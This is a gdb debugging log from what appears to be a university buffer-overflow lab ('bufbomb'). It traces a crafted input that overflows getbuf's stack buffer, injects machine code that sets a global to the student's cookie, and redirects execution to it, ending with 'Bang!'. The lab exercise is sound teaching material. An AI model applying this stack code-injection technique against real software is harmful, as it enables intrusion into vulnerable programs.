(gdb) r -u 3279655 < bang.bytes
Starting program: /home/auser/course-materials/lab3/bufbomb -u 3279655 < bang.bytes
Username: 3279655
bb
1e
5e
28
57
93
bb
61
Cookie: 0x61bb9357285e1ebb

Breakpoint 2, getbuf () at bufbomb.c:132
132	{
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x0000000000400da0 <+0>:	push   %rbp
   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
   0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
   0x0000000000400dbb <+27>:	mov    %rax,%rcx
   0x0000000000400dbe <+30>:	mul    %rdx
   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
   0x0000000000400dcc <+44>:	shl    $0x3,%rax
   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
   0x0000000000400de2 <+66>:	add    $0x1e,%rax
   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
   0x0000000000400dea <+74>:	sub    %rax,%rsp
   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
   0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
   0x0000000000400e09 <+105>:	add    $0x1,%rcx
   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
   0x0000000000400e16 <+118>:	mov    %rdx,%rax
   0x0000000000400e19 <+121>:	leaveq 
   0x0000000000400e1a <+122>:	retq   
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) info r
rax            0x0	0
rbx            0x5d163430	1561736240
rcx            0xdeadbeef	3735928559
rdx            0x30c81b2ae0	209515653856
rsi            0xc	12
rdi            0x0	0
rbp            0x7fffffffbbb0	0x7fffffffbbb0
rsp            0x7fffffffbb88	0x7fffffffbb88
r8             0x401337	4199223
r9             0x7ffff7ffb000	140737354117120
r10            0x0	0
r11            0x30c7e88729	209512335145
r12            0x607f80	6324096
r13            0x7fffffffe750	140737488349008
r14            0x0	0
r15            0x0	0
rip            0x400da0	0x400da0 <getbuf>
eflags         0x206	[ PF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x /40wx $rsp
0x7fffffffbb88:	0x00400ef3	0x00000000	0xffffbbc0	0x00007fff
0x7fffffffbb98:	0xdeadbeef	0x00000000	0xc81b0120	0x00000030
0x7fffffffbba8:	0x5d163430	0x00000000	0xffffe650	0x00007fff
0x7fffffffbbb8:	0x00400fdd	0x00000000	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbc8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbd8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbe8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbf8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbc08:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbc18:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
(gdb) n 2
137	  variable_length = alloca((val % 40) < 36 ? 36 : val % 40);
(gdb) disas
Dump of assembler code for function getbuf:
   0x0000000000400da0 <+0>:	push   %rbp
   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
=> 0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
   0x0000000000400dbb <+27>:	mov    %rax,%rcx
   0x0000000000400dbe <+30>:	mul    %rdx
   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
   0x0000000000400dcc <+44>:	shl    $0x3,%rax
   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
   0x0000000000400de2 <+66>:	add    $0x1e,%rax
   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
   0x0000000000400dea <+74>:	sub    %rax,%rsp
   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
   0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
   0x0000000000400e09 <+105>:	add    $0x1,%rcx
   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
   0x0000000000400e16 <+118>:	mov    %rdx,%rax
   0x0000000000400e19 <+121>:	leaveq 
   0x0000000000400e1a <+122>:	retq   
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) info r
rax            0x7fffffffbb50	140737488337744
rbx            0x5d163430	1561736240
rcx            0x118	280
rdx            0x30c81b2af0	209515653872
rsi            0xa	10
rdi            0x30c81b1340	209515647808
rbp            0x7fffffffbb80	0x7fffffffbb80
rsp            0x7fffffffbb50	0x7fffffffbb50
r8             0x7ffff7fdc740	140737353992000
r9             0x0	0
r10            0x22	34
r11            0x246	582
r12            0x607f80	6324096
r13            0x7fffffffe750	140737488349008
r14            0x0	0
r15            0x0	0
rip            0x400db1	0x400db1 <getbuf+17>
eflags         0x246	[ PF ZF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x /24wx $rsp
0x7fffffffbb50:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb60:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb70:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb80:	0x00000000	0x00000000	0xffffbb90	0x00007fff
0x7fffffffbb90:	0x08c4c749	0x49006023	0xbb2404c7	0x49285e1e
0x7fffffffbba0:	0x042444c7	0x61bb9357	0x40102068	0x0000c300
(gdb) x /40wx $rsp
0x7fffffffbb50:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb60:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb70:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb80:	0x00000000	0x00000000	0xffffbb90	0x00007fff
0x7fffffffbb90:	0x08c4c749	0x49006023	0xbb2404c7	0x49285e1e
0x7fffffffbba0:	0x042444c7	0x61bb9357	0x40102068	0x0000c300
0x7fffffffbbb0:	0xffffe650	0x00007fff	0x00400fdd	0x00000000
0x7fffffffbbc0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbd0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbe0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
(gdb) n 100
138	  for(i = 0; i < 36; i++)
(gdb) n
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
143	}
(gdb) 
0x00007fffffffbb90 in ?? ()
(gdb) disas
No function contains program counter for selected frame.
(gdb) list
138	  for(i = 0; i < 36; i++)
139	  {
140		variable_length[i] = buf[i];
141	  }
142	  return val % 40;
143	}
144	/* $end getbuf-c */
145	
146	/* /\* $begin kaboom-c *\/ */
147	/* int getbufn() */
(gdb) info r
rax            0x18	24
rbx            0x5d163430	1561736240
rcx            0x24	36
rdx            0x18	24
rsi            0x7fffffffbb33	140737488337715
rdi            0x0	0
rbp            0x0	0x0
rsp            0x7fffffffbb90	0x7fffffffbb90
r8             0x7fffffffbb10	140737488337680
r9             0x0	0
r10            0x22	34
r11            0x246	582
r12            0x607f80	6324096
r13            0x7fffffffe750	140737488349008
r14            0x0	0
r15            0x0	0
rip            0x7fffffffbb90	0x7fffffffbb90
eflags         0x246	[ PF ZF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) ^CQuit
(gdb) x /40wx 0x7fffffffbb90
0x7fffffffbb90:	0x08c4c749	0x49006023	0xbb2404c7	0x49285e1e
0x7fffffffbba0:	0x042444c7	0x61bb9357	0x40102068	0x0000c300
0x7fffffffbbb0:	0xffffe650	0x00007fff	0x00400fdd	0x00000000
0x7fffffffbbc0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbd0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbe0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbf0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbc00:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbc10:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbc20:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
(gdb) n
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) c
Continuing.
Type string: Bang!: You set global_value to 0x61bb9357285e1ebb
[Inferior 1 (process 9681) exited normally]

